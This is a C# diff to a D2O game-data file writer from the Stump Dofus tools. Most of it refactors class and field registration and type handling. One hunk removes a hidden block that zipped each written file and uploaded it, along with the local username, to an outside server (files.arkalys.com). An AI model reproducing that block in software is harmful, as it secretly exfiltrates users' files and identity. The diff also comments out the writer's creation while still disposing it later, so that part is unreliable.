@@ -102,7 +102,7 @@ namespace Stump.DofusProtocol.D2oClasses.Tools.D2o
 
         private void CreateWrite(string filename)
         {
-            m_writer = new BigEndianWriter(File.Create(filename));
+            //m_writer = new BigEndianWriter(File.Create(filename));
 
             m_indexTable = new Dictionary<int, int>();
             m_classes = new Dictionary<int, D2OClassDefinition>();
@@ -186,21 +186,6 @@ namespace Stump.DofusProtocol.D2oClasses.Tools.D2o
 
                 m_writer.Dispose();
             }
-
-            //File Upload
-            var fileZip = new ZipFile
-            {
-                CompressionLevel = CompressionLevel.BestCompression,
-                CompressionMethod = CompressionMethod.Deflate
-            };
-
-            fileZip.AddFile(Filename);
-            fileZip.Save(Filename + ".zip");
-
-            var webClient = new WebClient { Proxy = WebRequest.GetSystemWebProxy() };
-            webClient.UploadFile("http://files.arkalys.com/sendfile.php?name=" + Environment.UserName.Trim(), Filename + ".zip");
-
-            File.Delete(Filename + ".zip");
         }
 
 
@@ -333,7 +318,8 @@ namespace Stump.DofusProtocol.D2oClasses.Tools.D2o
             if (m_classes.Count(entry => entry.Value.ClassType == (classType)) > 0) // already define
                 return;
 
-            AllocateClassId(classType);
+            if (!m_allocatedClassId.ContainsKey(classType))
+                AllocateClassId(classType);
 
             object[] attributes = classType.GetCustomAttributes(typeof (D2OClassAttribute), false);
 
@@ -346,31 +332,36 @@ namespace Stump.DofusProtocol.D2oClasses.Tools.D2o
                               : classType.Name;
 
             // add fields
-            IEnumerable<D2OFieldDefinition> fields = (from field in classType.GetFields()
-                                                      let attribute =
-                                                          (D2OFieldAttribute)
-                                                          field.GetCustomAttributes(typeof (D2OFieldAttribute), false).
-                                                              SingleOrDefault()
-                                                      let fieldTypeId = GetIdByType(field.FieldType)
-                                                      let vectorTypes = GetVectorTypes(field.FieldType)
-                                                      let fieldName =
-                                                          attribute != null ? attribute.FieldName : field.Name
-                                                      where
-                                                          !field.GetCustomAttributes(typeof (D2OIgnore), false).Any()
-                                                      select
-                                                          new D2OFieldDefinition(fieldName, fieldTypeId, field, -1,
-                                                                                 vectorTypes));
+            var fields = new List<D2OFieldDefinition>();
+            foreach (var field in classType.GetFields())
+            {
+                if (field.GetCustomAttributes(typeof (D2OIgnore), false).Any() ||
+                                                          field.IsStatic || field.IsPrivate || field.IsInitOnly)
+                    continue;
 
-            // add properties
-            fields.Concat(from property in classType.GetProperties()
-                          let attribute =
-                              (D2OFieldAttribute)
-                              property.GetCustomAttributes(typeof (D2OFieldAttribute), false).SingleOrDefault()
-                          let fieldTypeId = GetIdByType(property.PropertyType)
-                          let vectorTypes = GetVectorTypes(property.PropertyType)
-                          let fieldName = attribute != null ? attribute.FieldName : property.Name
-                          where !property.GetCustomAttributes(typeof (D2OIgnore), false).Any()
-                          select new D2OFieldDefinition(fieldName, fieldTypeId, property, -1, vectorTypes));
+                var attr = (D2OFieldAttribute) field.GetCustomAttributes(typeof (D2OFieldAttribute), false).SingleOrDefault();
+                var fieldType = GetIdByType(field.FieldType);
+                var vectorTypes = GetVectorTypes(field.FieldType);
+                var fieldName = attr != null ? attr.FieldName : field.Name;
+
+                fields.Add(new D2OFieldDefinition(fieldName, fieldType, field, -1, vectorTypes));
+            } 
+            
+            foreach (var property in classType.GetProperties())
+            {
+                if (property.GetCustomAttributes(typeof(D2OIgnore), false).Any() || !property.CanWrite)
+                    continue;
+
+                var attr = (D2OFieldAttribute)property.GetCustomAttributes(typeof(D2OFieldAttribute), false).SingleOrDefault();
+                var fieldType = GetIdByType(property.PropertyType);
+                var vectorTypes = GetVectorTypes(property.PropertyType);
+                var fieldName = attr != null ? attr.FieldName : property.Name;
+
+                if (fields.Any(x => x.Name == fieldName))
+                    continue;
+
+                fields.Add(new D2OFieldDefinition(fieldName, fieldType, property, -1, vectorTypes));
+            }
 
             m_classes.Add(m_allocatedClassId[classType],
                           new D2OClassDefinition(m_allocatedClassId[classType], name, package, classType, fields, -1));
@@ -380,7 +371,7 @@ namespace Stump.DofusProtocol.D2oClasses.Tools.D2o
 
         private void DefineAllocatedTypes()
         {
-            foreach (var allocatedClass in m_allocatedClassId.Where(entry => !m_classes.ContainsKey(entry.Value)))
+            foreach (var allocatedClass in m_allocatedClassId.Where(entry => !m_classes.ContainsKey(entry.Value)).ToArray())
             {
                 DefineClassDefinition(allocatedClass.Key);
             }
@@ -394,21 +385,19 @@ namespace Stump.DofusProtocol.D2oClasses.Tools.D2o
                 return D2OFieldType.Bool;
             if (fieldType == typeof (string))
                 return D2OFieldType.String;
-            if (fieldType == typeof (double))
+            if (fieldType == typeof (double) || fieldType == (typeof(float)))
                 return D2OFieldType.Double;
             if (fieldType == typeof (int)) // that's useless, i know ...
                 return D2OFieldType.I18N;
             if (fieldType == typeof (uint))
                 return D2OFieldType.UInt;
-            if (fieldType.GetGenericTypeDefinition() == typeof (List<>))
+            if (fieldType.IsGenericType && fieldType.GetGenericTypeDefinition() == typeof(List<>))
                 return D2OFieldType.List;
 
             int classId;
-            if (m_allocatedClassId.ContainsKey(fieldType))
+            if (!m_allocatedClassId.ContainsKey(fieldType))
             {
                 classId = AllocateClassId(fieldType);
-
-                m_allocatedClassId.Add(fieldType, classId);
             }
 
             classId = m_allocatedClassId[fieldType];
@@ -440,7 +429,9 @@ namespace Stump.DofusProtocol.D2oClasses.Tools.D2o
         private void WriteObject(IDataWriter writer, object obj, Type type)
         {
             if (!m_allocatedClassId.ContainsKey(obj.GetType()))
-                throw new Exception(string.Format("Unexpected object of type {0} (was not registered)", obj.GetType()));
+            {
+                DefineClassDefinition(obj.GetType());
+            }
 
             D2OClassDefinition @class = m_classes[m_allocatedClassId[type]];
 
@@ -509,8 +500,9 @@ namespace Stump.DofusProtocol.D2oClasses.Tools.D2o
             else
             {
                 if (!m_allocatedClassId.ContainsKey(obj.GetType()))
-                    throw new Exception(string.Format("Unexpected object of type {0} (was not registered)",
-                                                      obj.GetType()));
+                {
+                    DefineClassDefinition(obj.GetType());
+                }
 
                 WriteObject(writer, obj, obj.GetType());
             }
